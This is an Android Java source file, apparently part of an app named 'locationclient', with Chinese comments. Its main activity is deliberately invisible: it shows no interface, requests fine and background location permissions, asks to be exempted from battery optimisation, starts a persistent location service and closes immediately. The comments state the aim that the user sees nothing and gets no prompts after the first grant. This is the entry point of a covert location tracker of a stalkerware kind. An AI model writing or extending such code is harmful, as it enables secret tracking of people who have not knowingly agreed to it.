package com.example.locationclient;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.content.Context;
import androidx.core.content.ContextCompat;

/**
 * 透明入口 Activity:不设置任何内容视图,启动后立刻请求必要权限并启动后台服务,
 * 然后立即 finish(),用户看不到任何界面。
 *
 * 注意:Android 系统要求位置权限必须由用户首次手动授予,无法静默获取。
 * 因此第一次安装后点击图标会弹出系统权限对话框(系统行为,非本应用主动弹窗),
 * 授予一次后,之后开机自启将不再有任何提示。
 */
public class MainActivity extends Activity {

    private static final int REQ_PERMISSIONS = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // 不调用 setContentView,保持完全透明、无界面

        if (!hasCorePermissions()) {
            requestCorePermissions();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasBackgroundLocation()) {
            requestBackgroundLocation();
        } else {
            // 权限齐全,启动服务并退出
            startLocationService();
            finish();
        }
    }

    private boolean hasCorePermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasBackgroundLocation() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true;
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    private void requestCorePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQ_PERMISSIONS);
        } else {
            // API 21-22 权限安装时授予,直接启动服务
            startLocationService();
            finish();
        }
    }

    private void requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
            }, REQ_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            if (hasCorePermissions()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasBackgroundLocation()) {
                    requestBackgroundLocation();
                    return;
                }
                // 请求忽略电池优化(提升后台存活率,非必须)
                requestIgnoreBatteryOptimization();
                startLocationService();
            }
            // 无论授权与否都退出,不阻塞用户
            finish();
        }
    }

    private void requestIgnoreBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                String pkg = getPackageName();
                if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
                    Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + pkg));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    // 使用系统自带行为,若失败则忽略
                    if (intent.resolveActivity(getPackageManager()) != null) {
                        startActivity(intent);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startLocationService() {
        Intent intent = new Intent(this, LocationService.class);
        intent.setAction(LocationService.ACTION_START);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
